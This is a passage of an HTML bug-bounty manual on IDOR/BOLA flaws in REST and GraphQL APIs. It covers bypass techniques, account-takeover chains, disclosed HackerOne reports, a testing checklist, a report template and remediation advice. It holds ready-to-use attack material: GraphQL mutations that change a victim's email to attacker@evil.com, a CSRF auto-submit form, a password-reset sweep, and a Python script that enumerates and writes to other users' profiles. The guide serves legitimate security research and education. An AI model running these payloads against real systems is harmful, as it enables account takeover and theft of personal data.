+    <p>BOLA (Broken Object Level Authorization) is IDOR's API-native name. GraphQL introduces unique patterns worth mastering.</p>
+  </div>
+
+  <h3>7.1 REST API BOLA Patterns</h3>
+  <pre><span class="c"># Nested resource references:</span>
+GET /api/v1/users/<span class="bad">VICTIM_ID</span>/orders
+GET /api/v1/organizations/<span class="bad">OTHER_ORG_ID</span>/members
+GET /api/v1/projects/<span class="bad">OTHER_PROJECT_ID</span>/documents
+
+<span class="c"># Add ID parameter to unparameterized endpoints:</span>
+GET /api/v1/getuser              →  returns YOUR profile
+GET /api/v1/getuser?<span class="bad">id=VICTIM</span>   →  returns VICTIM's profile ← IDOR
+
+<span class="c"># API versioning BOLA (old version lacks auth check):</span>
+GET /api/v2/user/me/details               →  403 (protected)
+GET /api/v1/user/details?id=<span class="bad">VICTIM_ID</span>    →  200 ← IDOR (old endpoint)</pre>
+
+  <h3>7.2 GraphQL BOLA</h3>
+  <pre><span class="c"># Step 1: Test if introspection is enabled:</span>
+{"query": "{__typename}"}
+
+<span class="c"># Step 2: Dump full schema to find ID-accepting queries:</span>
+{"query": "{__schema{types{name fields{name args{name}}}}}"}
+
+<span class="c"># Step 3: IDOR via direct query with victim's ID:</span>
+{"query": "{user(id: \"<span class="bad">VICTIM_ID</span>\") {email phone address}}"}
+
+<span class="c"># Step 4: Decode GraphQL global IDs (base64: Type:ID):</span>
+echo "VXNlcjoxMjM0" | base64 -d  →  User:1234
+echo -n "User:1233" | base64     →  VXNlcjoxMjMz  ← use in query
+
+<span class="c"># Step 5: Batch query to enumerate 100 users in ONE request:</span>
+{"query": "{
+  u1: user(id: \"1001\") { email }
+  u2: user(id: \"1002\") { email }
+  u3: user(id: \"1003\") { email }
+}"}
+
+<span class="c"># Step 6: Write IDOR via mutation:</span>
+{"mutation": "mutation {updateUser(id: \"<span class="bad">VICTIM_ID</span>\", input: {email: \"att@evil.com\"}) {user{email}}}"}
+
+<span class="c"># Tools: InQL (Burp extension), graphql-cop, graphql-voyager</span></pre>
+
+  <div class="info-box bounty">
+    <div class="box-title">🎯 Real GraphQL IDOR — $12,500 Payout</div>
+    <p>On a fintech target: GraphQL introspection was enabled. Schema enumeration revealed <code>getTransaction(id: ID!)</code>. Batch aliases in a single mutation accessed and modified other users' financial transactions. CVSS 9.1 → $12,500.</p>
+  </div>
+</section>
+
+<!-- CH8 -->
+<section id="ch8">
+  <div class="chapter-header" data-ch="08">
+    <div class="ch-label">Chapter 08</div>
+    <h2>Bypassing ID Protections</h2>
+    <p>Modern apps add layers of obfuscation and partial validation. Here's how to punch through each one.</p>
+  </div>
+
+  <h3>8.1 Content-Type Switching</h3>
+  <pre><span class="c"># Protected in JSON — try XML, form-encoded, or multipart:</span>
+<span class="c"># Original (blocked):</span>
+Content-Type: application/json
+{"user_id": "<span class="bad">VICTIM</span>"}  →  403
+
+<span class="c"># Try XML:</span>
+Content-Type: application/xml
+&lt;root&gt;&lt;user_id&gt;<span class="bad">VICTIM</span>&lt;/user_id&gt;&lt;/root&gt;  →  200?
+
+<span class="c"># Try form-encoded:</span>
+Content-Type: application/x-www-form-urlencoded
+user_id=<span class="bad">VICTIM</span>  →  200?</pre>
+
+  <h3>8.2 Extension / Format Switching</h3>
+  <pre><span class="c"># Access control may only be enforced on certain response formats:</span>
+GET /api/receipt/<span class="bad">2983</span>       →  403 (JSON)
+GET /api/receipt/<span class="bad">2983</span>.json  →  200 ← different code path!
+GET /api/receipt/<span class="bad">2983</span>.xml   →  200
+GET /api/receipt/<span class="bad">2983</span>.csv   →  200
+GET /api/receipt/<span class="bad">2983</span>.pdf   →  200</pre>
+
+  <h3>8.3 HTTP Parameter Pollution</h3>
+  <pre><span class="c"># Send ID parameter twice — validator checks first, backend uses last:</span>
+GET /api/user?user_id=<span class="ok">YOUR_ID</span>&user_id=<span class="bad">VICTIM_ID</span>
+<span class="c"># Validator: user_id=YOUR_ID ✓ | Backend uses: user_id=VICTIM_ID ← IDOR
+
+# JSON array pollution:</span>
+{"user_id": ["<span class="ok">YOUR_ID</span>", "<span class="bad">VICTIM_ID</span>"]}   <span class="c">← backend processes both</span></pre>
+
+  <h3>8.4 Mass Assignment</h3>
+  <pre><span class="c"># Server binds all request params to the user model without filtering:</span>
+POST /api/user/update
+{"name": "John", "<span class="bad">is_admin</span>": true}     <span class="c">← privilege escalation</span>
+{"name": "John", "<span class="bad">balance</span>": 99999}      <span class="c">← financial fraud</span>
+{"name": "John", "<span class="bad">subscription</span>": "enterprise"}   <span class="c">← free upgrade</span>
+
+<span class="c"># Find mass assignment field names from: API docs, source code, error messages</span></pre>
+</section>
+
+<!-- CH9 -->
+<section id="ch9">
+  <div class="chapter-header" data-ch="09">
+    <div class="ch-label">Chapter 09</div>
+    <h2>Chaining IDOR for Critical Impact</h2>
+    <p>Individual IDOR is High. Chained with other techniques it becomes Critical — the highest bounties come from chains.</p>
+  </div>
+
+  <h3>9.1 IDOR → Full Account Takeover Chains</h3>
+  <div class="flow">
+    <div class="flow-step bad"><div class="flow-num">1</div><div class="flow-text"><strong>Read IDOR → Get victim's email → Password Reset → ATO</strong><span>Read email via IDOR → trigger password reset to that email → victim's inbox → full ATO</span></div></div>
+    <div class="flow-step bad"><div class="flow-num">2</div><div class="flow-text"><strong>Write IDOR → Change victim's email → Password Reset → ATO</strong><span>Change victim's email to attacker@evil.com → trigger reset → email arrives → ATO. Most critical chain.</span></div></div>
+    <div class="flow-step bad"><div class="flow-num">3</div><div class="flow-text"><strong>Write IDOR → Disable victim's MFA → Login</strong><span>PATCH /api/users/VICTIM/mfa {"enabled": false} → log in with stolen/guessed password</span></div></div>
+    <div class="flow-step ok"><div class="flow-num">4</div><div class="flow-text"><strong>Write IDOR → Change password directly → ATO</strong><span>POST /api/users/VICTIM/password {"new_password": "hacked"} → immediate ATO, no email required</span></div></div>
+  </div>
+
+  <h3>9.2 IDOR + CSRF = Unauthenticated IDOR</h3>
+  <pre><span class="c"># If IDOR endpoint also lacks CSRF protection:</span>
+&lt;img src="https://target.com/api/user/<span class="bad">VICTIM_ID</span>/delete"&gt;
+<span class="c"># → Victim's account deleted when they visit attacker's page (no click needed)</span>
+
+&lt;form method="POST" action="https://target.com/api/users/<span class="bad">VICTIM_ID</span>/email"&gt;
+  &lt;input name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+<span class="c"># → Victim's email changed silently, enables ATO</span></pre>
+
+  <h3>9.3 Impact Chains & Bounty Ranges</h3>
+  <table class="data-table">
+    <tr><th>Chain</th><th>Impact</th><th>Bounty Range</th></tr>
+    <tr><td>IDOR → Read email → Reset → ATO</td><td>Full account takeover</td><td>$5K–$15K</td></tr>
+    <tr><td>IDOR → Write email → Reset → ATO</td><td>Full account takeover</td><td>$5K–$20K</td></tr>
+    <tr><td>IDOR → Disable MFA → Login</td><td>MFA bypass + ATO</td><td>$3K–$10K</td></tr>
+    <tr><td>IDOR → Read PII × 1000 users</td><td>Mass data breach</td><td>$10K–$20K</td></tr>
+    <tr><td>IDOR → Elevate role to Admin</td><td>Full platform takeover</td><td>$10K–$20K</td></tr>
+    <tr><td>IDOR + CSRF → No-click action</td><td>Unauthenticated critical</td><td>$5K–$15K</td></tr>
+    <tr><td>IDOR → Read API keys / secrets</td><td>Infrastructure compromise</td><td>$5K–$15K</td></tr>
+  </table>
+</section>
+
+<!-- CH10 -->
+<section id="ch10">
+  <div class="chapter-header" data-ch="10">
+    <div class="ch-label">Chapter 10</div>
+    <h2>Real-World Bug Bounty Reports</h2>
+    <p>Actual disclosed reports with exact chains, PoCs, bounties, and lessons.</p>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div><div class="r-company">GitLab — Write/Delete IDOR on Repository Objects</div><span class="r-badge r-critical">CRITICAL</span></div>
+      <div class="r-bounty">$20,000</div>
+    </div>
+    <p><strong>HackerOne | Highest IDOR payout in dataset analysis</strong></p>
+    <p>A regular authenticated GitLab user could modify or delete repository objects belonging to other organizations via sequential integer IDs in a GitLab API endpoint. No membership in the target repository was required. The write/delete nature drove the maximum payout.</p>
+    <ol style="margin:12px 0 0 20px">
+      <li>Identify GitLab API endpoint accepting sequential resource ID</li>
+      <li>Create two accounts in different organizations, note both IDs</li>
+      <li>Use Account A to PUT/DELETE on Account B's resource ID</li>
+      <li>Server performs operation without ownership check</li>
+      <li>Demonstrate sweep: affect any repository across the platform</li>
+    </ol>
+    <div class="info-box bounty" style="margin-top:14px"><div class="box-title">💡 Lesson</div><p>Write/delete IDOR always pays more than read IDOR. When you find a read IDOR, immediately probe PUT, PATCH, DELETE on the same path.</p></div>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div><div class="r-company">Snapchat — IDOR Adding Viewers to Any Private Story</div><span class="r-badge r-critical">CRITICAL</span></div>
+      <div class="r-bounty">$15,000</div>
+    </div>
+    <p><strong>HackerOne | Write-based IDOR</strong></p>
+    <p>Snapchat's private stories API accepted a story_id without verifying the requesting user had permission to manage that story. An attacker could add themselves as a viewer to any private story by supplying another user's story_id in the viewer management endpoint.</p>
+    <ol style="margin:12px 0 0 20px">
+      <li>Create private story as Account A, note story_id</li>
+      <li>As Account B: POST <code>/api/stories/STORY_ID_A/viewers</code> with B's user_id</li>
+      <li>Server adds B without checking ownership</li>
+      <li>Account B can now view Account A's private story</li>
+      <li>Write nature (modifying another user's settings) = Critical</li>
+    </ol>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div><div class="r-company">Facebook — IDOR Accessing Private Group Notes Media</div><span class="r-badge r-critical">CRITICAL</span></div>
+      <div class="r-bounty">$10,000</div>
+    </div>
+    <p><strong>HackerOne | Researcher: Raja Sudhakar</strong></p>
+    <p>By manipulating the media_id in Facebook Groups Notes API, any user could view private media in groups they were never a member of. The media storage endpoint performed insufficient group membership verification.</p>
+    <ol style="margin:12px 0 0 20px">
+      <li>Create private Group A, add a Note with media — note the media_id</li>
+      <li>From Account B (not in Group A): <code>graph.facebook.com/MEDIA_ID</code></li>
+      <li>Private group media returned — no membership check</li>
+      <li>Scalable: enumerate media IDs to access any private group's content</li>
+    </ol>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div><div class="r-company">Facebook Business — IDOR Creating Share Links for Any Campaign</div><span class="r-badge r-high">HIGH</span></div>
+      <div class="r-bounty">$5,375</div>
+    </div>
+    <p><strong>HackerOne | Researcher: Sancyty — 2025</strong></p>
+    <p>Facebook Business's Campaign Planner share link API accepted any campaign_id without ownership verification. An attacker could generate a share link for any advertiser's campaign, granting themselves read access to competitor campaign plans, budgets, and targeting strategies.</p>
+    <ol style="margin:12px 0 0 20px">
+      <li>Intercept "Create Share Link": POST <code>/campaign-planner/share</code></li>
+      <li>Change campaign_id to competitor's campaign ID</li>
+      <li>Server generates valid share link for victim's campaign</li>
+      <li>Access link → read full campaign budget, targeting, strategy</li>
+    </ol>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div><div class="r-company">HackerOne — GraphQL IDOR Deleting Certifications</div><span class="r-badge r-high">HIGH</span></div>
+      <div class="r-bounty">Paid</div>
+    </div>
+    <p><strong>HackerOne self-disclosed — GraphQL mutation IDOR</strong></p>
+    <p>HackerOne's own <code>CreateOrUpdateHackerCertification</code> GraphQL mutation accepted another hacker's certification ID with <code>_destroy: true</code> — allowing deletion of credentials from any hacker's public profile.</p>
+    <pre style="margin-top:12px">mutation {
+  CreateOrUpdateHackerCertification(input: {
+    id: "<span class="bad">VICTIM_CERT_ID</span>",
+    _destroy: <span class="bad">true</span>
+  }) { hackerCertification { id } }
+}</pre>
+  </div>
+
+  <div class="report-card">
+    <div class="r-header">
+      <div><div class="r-company">GraphQL Fintech — BOLA + Batch Queries → Financial Data</div><span class="r-badge r-critical">CRITICAL · CVSS 9.1</span></div>
+      <div class="r-bounty">$12,500</div>
+    </div>
+    <p><strong>HackerOne | InfoSec Write-ups — April 2026</strong></p>
+    <p>Fintech GraphQL API had introspection enabled. Schema enumeration revealed <code>getTransaction(id: ID!)</code>. Batch aliases in a single mutation accessed and modified financial transactions belonging to other users. CVSS 9.1 score.</p>
+    <ol style="margin:12px 0 0 20px">
+      <li>Query <code>__schema</code> → discover getTransaction, updateTransaction</li>
+      <li>Sequential transaction IDs confirmed via one-at-a-time test</li>
+      <li>Batch: <code>t1:getTransaction(id:"1001"){amount} t2:getTransaction(id:"1002"){amount}...</code></li>
+      <li>Financial data for all users returned in one response</li>
+      <li>Mutation: <code>updateTransaction(id:"VICTIM_TX", amount: 0.01)</code></li>
+      <li>Financial transaction modified → CVSS 9.1 → $12,500</li>
+    </ol>
+  </div>
+
+  <div class="report-card" style="border-left-color:var(--red)">
+    <div class="r-header">
+      <div><div class="r-company">University Platform — Unauthenticated IDOR → Mass ATO</div><span class="r-badge r-critical">CRITICAL · Unauthenticated</span></div>
+      <div class="r-bounty">Critical Paid</div>
+    </div>
+    <p><strong>HackerOne (redacted education program)</strong></p>
+    <p>Password reset endpoint accepted a user_id with no authentication or verification token. Any visitor could reset any student/staff account by knowing the sequential user ID. The entire university user base was vulnerable to mass account takeover with zero authentication.</p>
+    <pre style="margin-top:12px"><span class="c"># No auth required at all:</span>
+POST /api/auth/reset-password
+{"user_id": <span class="bad">1234</span>, "new_password": "hacked"}
+<span class="c"># → Password for user 1234 changed immediately
+# Sweep user IDs 1–50000 → entire university compromised</span></pre>
+    <div class="info-box danger" style="margin-top:14px"><div class="box-title">⚡ Lesson</div><p>Always test IDOR endpoints without any authentication cookie or token. Some endpoints are completely unauthenticated — discovered because developers thought obscure URLs were "safe." Unauthenticated IDOR is always Critical.</p></div>
+  </div>
+</section>
+
+<!-- CH11 -->
+<section id="ch11">
+  <div class="chapter-header" data-ch="11">
+    <div class="ch-label">Chapter 11</div>
+    <h2>Complete Testing Checklist</h2>
+    <p>Every parameter, every method, every bypass — the definitive IDOR test matrix.</p>
+  </div>
+
+  <h3>11.1 Master IDOR Test Checklist</h3>
+  <pre><span class="c">── LOCATION COVERAGE ──────────────────────────────────────────────</span>
+<span class="ok">☐</span> URL path parameters:        /api/users/<span class="bad">ID</span>/profile
+<span class="ok">☐</span> URL query parameters:       /api/docs?id=<span class="bad">ID</span>&user=<span class="bad">ID</span>
+<span class="ok">☐</span> Request body (JSON):        {"user_id": "<span class="bad">ID</span>"}
+<span class="ok">☐</span> Request body (form):        user_id=<span class="bad">ID</span>&resource=<span class="bad">ID</span>
+<span class="ok">☐</span> Custom HTTP headers:        X-User-ID / X-Account-ID / X-Tenant-ID
+<span class="ok">☐</span> Cookie values:              session_user=<span class="bad">ID</span>
+<span class="ok">☐</span> File paths / names:         /uploads/<span class="bad">userID</span>-invoice.pdf
+<span class="ok">☐</span> GraphQL variables:          (id: "<span class="bad">ID</span>") in queries and mutations
+<span class="ok">☐</span> WebSocket messages:         {"type":"get_data","user_id":"<span class="bad">ID</span>"}
+
+<span class="c">── METHOD COVERAGE ────────────────────────────────────────────────</span>
+<span class="ok">☐</span> GET     /resource/<span class="bad">ID</span>    (read)
+<span class="ok">☐</span> POST    /resource/<span class="bad">ID</span>    (create/action)
+<span class="ok">☐</span> PUT     /resource/<span class="bad">ID</span>    (replace)
+<span class="ok">☐</span> PATCH   /resource/<span class="bad">ID</span>    (partial update)
+<span class="ok">☐</span> DELETE  /resource/<span class="bad">ID</span>    (delete)
+<span class="ok">☐</span> HEAD    /resource/<span class="bad">ID</span>    (existence oracle)
+
+<span class="c">── ID TYPE COVERAGE ──────────────────────────────────────────────</span>
+<span class="ok">☐</span> Try adjacent IDs: TARGET±1, TARGET±100
+<span class="ok">☐</span> Use Account B's IDs from Account A's session
+<span class="ok">☐</span> Try IDs from different organizations/tenants
+<span class="ok">☐</span> Try admin/low-number IDs: 1, 2, 3, 10
+<span class="ok">☐</span> Try without any auth cookie (unauthenticated IDOR)
+<span class="ok">☐</span> Decode base64/GraphQL IDs, increment, re-encode
+
+<span class="c">── BYPASS TECHNIQUES ─────────────────────────────────────────────</span>
+<span class="ok">☐</span> Content-Type switching (JSON → XML → form-encoded)
+<span class="ok">☐</span> Extension appending (.json, .xml, .csv, .pdf)
+<span class="ok">☐</span> Older API versions (/v1 instead of /v3)
+<span class="ok">☐</span> Add ID param to unparameterized endpoints
+<span class="ok">☐</span> HTTP parameter pollution (id=YOURS&id=VICTIM)
+<span class="ok">☐</span> Mass assignment (add isAdmin, role, balance)
+<span class="ok">☐</span> Method switching (GET blocked → DELETE works)</pre>
+
+  <h3>11.2 Python IDOR Enumeration Script</h3>
+  <pre>import requests, json
+
+YOUR_SESSION = "your_session_cookie"
+VICTIM_ID_START = 1230
+VICTIM_ID_END = 1240
+YOUR_ID = 1234
+
+headers = {"Cookie": f"session={YOUR_SESSION}"}
+
+for uid in range(VICTIM_ID_START, VICTIM_ID_END + 1):
+    if uid == YOUR_ID:
+        continue
+    <span class="c"># Test read IDOR</span>
+    r = requests.get(f"https://target.com/api/users/{uid}/profile", headers=headers)
+    if r.status_code == 200:
+        data = r.json()
+        print(f"[READ IDOR] user_id={uid} email={data.get('email','?')}")
+
+    <span class="c"># Test write IDOR</span>
+    w = requests.put(f"https://target.com/api/users/{uid}/profile",
+        headers=headers,
+        json={"test_field": "idor_check"})
+    if w.status_code in [200, 204]:
+        print(f"[WRITE IDOR] user_id={uid} → {w.status_code}")</pre>
+</section>
+
+<!-- CH12 -->
+<section id="ch12">
+  <div class="chapter-header" data-ch="12">
+    <div class="ch-label">Chapter 12</div>
+    <h2>Methodology, Tools &amp; Writing Winning Reports</h2>
+    <p>A professional workflow from recon to maximum bounty payout.</p>
+  </div>
+
+  <h3>12.1 Professional IDOR Hunting Workflow</h3>
+  <div class="phase">Phase 1 — Recon & Surface Mapping</div>
+  <pre><span class="c"># Crawl all endpoints, collect parameterized URLs:</span>
+gau target.com | grep -E "=[0-9a-f-]+" | sort -u > param_urls.txt
+
+<span class="c"># Extract API endpoints from JS bundles:</span>
+wget -q -O- https://target.com/app.js | grep -oP '"/api/[a-z0-9/_-]+"' | sort -u
+
+<span class="c"># Check for Swagger / OpenAPI documentation:</span>
+for path in swagger.json api-docs openapi.yaml v1/docs; do
+  curl -so /dev/null -w "%{http_code} $path\n" https://target.com/$path
+done</pre>
+
+  <div class="phase">Phase 2 — ID Harvesting</div>
+  <pre><span class="c"># Log in as Account B, document ALL IDs in a table:
+# | Endpoint             | B's ID  | Type         | Sensitivity |
+# | /api/orders/{id}    | 50123   | Sequential   | High        |
+# | /api/docs/{uuid}    | a3f7b2  | UUID         | High        |
+
+# Collect IDs from: notifications, email content,
+# search results, shared links, error messages, export files</span></pre>
+
+  <div class="phase">Phase 3 — Systematic Testing</div>
+  <pre><span class="c"># For each ID from B, logged in as A:
+# 1. Try GET, POST, PUT, PATCH, DELETE
+# 2. Try in URL path, query string, request body
+# 3. Try content-type variations
+# 4. Try API version variations
+# 5. Use Autorize extension for automated coverage
+# 6. Manual focus on write/delete endpoints</span></pre>
+
+  <h3>12.2 Toolset</h3>
+  <table class="data-table">
+    <tr><th>Tool</th><th>Purpose</th></tr>
+    <tr><td>Burp Suite Pro</td><td>Intercept, Repeater, Intruder for ID enumeration, Logger for traffic</td></tr>
+    <tr><td>Autorize (Burp)</td><td>Automated two-account IDOR testing — replays all requests with victim session</td></tr>
+    <tr><td>Auth Analyzer (Burp)</td><td>Tests authorization across multiple roles simultaneously</td></tr>
+    <tr><td>InQL (Burp)</td><td>GraphQL schema introspection, query fuzzing, IDOR detection</td></tr>
+    <tr><td>Arjun</td><td>Parameter discovery — finds hidden id= parameters on endpoints</td></tr>
+    <tr><td>gau / waybackurls</td><td>Historical URL discovery — zombie API endpoints with missing auth</td></tr>
+    <tr><td>ffuf</td><td>Fast ID fuzzing: <code>ffuf -u /api/user/FUZZ -w id_list.txt -mc 200</code></td></tr>
+    <tr><td>graphql-cop</td><td>GraphQL security auditing — finds BOLA, introspection, batching issues</td></tr>
+    <tr><td>uuid-predict</td><td>Predict UUID v1 values from a known UUID</td></tr>
+    <tr><td>nuclei</td><td>IDOR template-based detection at scale across many targets</td></tr>
+  </table>
+
+  <h3>12.3 The Winning Bug Report Template</h3>
+  <pre><span class="c">## TITLE
+[CRITICAL] IDOR in /api/users/{id}/profile → PII Exposure + Account
+Takeover via Email Modification
+
+## SEVERITY: Critical
+CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (8.1)
+
+## SUMMARY
+The /api/users/{id}/profile endpoint accepts a user ID without verifying
+the authenticated user owns that resource. Attacker with any valid account
+can: (1) read any user's PII, and (2) change any user's email address,
+enabling full account takeover via password reset.
+
+## SETUP
+Account A (attacker): attacker@test.com, user_id = 1234
+Account B (victim):   victim@test.com,   user_id = 1235
+
+## STEPS TO REPRODUCE — Read IDOR
+1. Log in as Account A
+2. GET /api/users/1235/profile  Authorization: Bearer [A's token]
+3. Result: Account B's full profile (name, email, phone, address) returned
+
+## STEPS TO REPRODUCE — Write IDOR → Account Takeover
+4. PUT /api/users/1235/profile  {"email": "attacker@evil.com"}
+5. Response: 200 OK — B's email changed
+6. POST /api/auth/forgot-password  {"email": "attacker@evil.com"}
+7. Reset email arrives at attacker@evil.com
+8. Reset password → full access to Account B
+
+## PROOF OF CONCEPT
+[Screenshot 1: B's profile returned with A's token]
+[Screenshot 2: 200 OK on email change PUT request]
+[Screenshot 3: Password reset email received by attacker]
+[Screenshot 4: Logged in as Account B]
+
+## IMPACT
+- Read: Full PII of every user accessible to any authenticated user
+- Write: Any user's email/password changeable → full account takeover
+- Mass: Sweep user IDs to affect entire user base
+- Admin: Low-numbered IDs (1–10) are admin accounts — same vulnerability applies
+
+## REMEDIATION
+1. Implement ownership check on every endpoint:
+   assert(request.user.id == resource.owner_id)
+2. Use indirect references (session-scoped tokens mapped to real IDs)
+3. Deploy centralized authorization middleware, not per-endpoint checks
+4. Audit ALL endpoints — both read AND write — for consistent enforcement</span></pre>
+
+  <h3>12.4 Practice Resources</h3>
+  <table class="data-table">
+    <tr><th>Resource</th><th>Type</th><th>Cost</th></tr>
+    <tr><td>PortSwigger Web Security Academy — Access Control</td><td>13 free labs including IDOR</td><td>Free</td></tr>
+    <tr><td>OWASP crAPI (Completely Ridiculous API)</td><td>Intentionally vulnerable REST+GraphQL with IDOR</td><td>Free/GitHub</td></tr>
+    <tr><td>vAPI (Vulnerable API)</td><td>OWASP API Security Top 10 — BOLA/IDOR labs</td><td>Free/GitHub</td></tr>
+    <tr><td>HackTheBox — API Fundamentals Track</td><td>Real environments with REST/GraphQL IDOR</td><td>Free/Pro</td></tr>
+    <tr><td>PentesterLab — IDOR badge</td><td>Guided exercises easy to expert</td><td>Pro $20/mo</td></tr>
+    <tr><td>HackerOne Hacktivity (filter: IDOR)</td><td>1000+ real disclosed reports</td><td>Free</td></tr>
+    <tr><td>Bug Bounty Bootcamp — Vickie Li Ch.10</td><td>Best printed IDOR chapter available</td><td>~$40</td></tr>
+    <tr><td>AllAboutBugBounty IDOR (GitHub)</td><td>Parameter wordlist and technique reference</td><td>Free</td></tr>
+  </table>
+
+  <hr>
+
+  <div class="info-box bounty">
+    <div class="box-title">🎯 Key Takeaways</div>
+    <p><strong>The one missing question:</strong> Every IDOR is caused by the server checking "is this user logged in?" but not "does this user own this object?" Understand this → write better reports and better remediation recommendations.</p>
+    <p><strong>Two accounts, always:</strong> You cannot properly test IDOR with one account. Set up both before touching any target. Log every ID from Account B before switching to A.</p>
+    <p><strong>Write &gt; Read for bounty:</strong> A read IDOR showing PII = High. A write IDOR changing email → password reset → ATO = Critical. Always probe write operations after finding any read IDOR.</p>
+    <p><strong>UUIDs are not security:</strong> Only prevent guessing. Leaked UUIDs (and they always leak) restore the IDOR. Hunt for UUID leakage in API responses, exports, notifications, and error messages.</p>
+    <p><strong>Zombie APIs are goldmines:</strong> v1, v2, mobile-specific, and undocumented endpoints are the richest IDOR targets. They survive refactors without their auth checks. Use gau, JS analysis, and mobile traffic to find them.</p>
+    <p><strong>GraphQL triples the surface:</strong> One endpoint, dozens of BOLA targets. Enable introspection test on every GraphQL target — every query and mutation accepting an ID is a test case. Batch aliases make mass enumeration trivial.</p>
+  </div>
+</section>
+
+</main>
+
+<footer style="background:var(--surface);border-top:1px solid var(--border);padding:32px 24px;text-align:center;">
+  <p style="color:var(--muted);font-size:13px;font-family:'JetBrains Mono',monospace;">
+    IDOR COMPLETE FIELD MANUAL · Bug Bounty Edition 2025–2026<br>
+    <span style="color:var(--accent);">For authorized security research and education only.</span><br>
+    Compiled from: Intigriti IDOR guide, HackerOne Hacktivity, thebughunter.blog 250-report analysis,
+    PortSwigger Access Control labs, arxiv BOLA taxonomy 2026, ProwlSec 2025 bounty analysis, AllAboutBugBounty, InfoSec Write-ups.
+  </p>
+</footer>
+
+</body>
+</html>
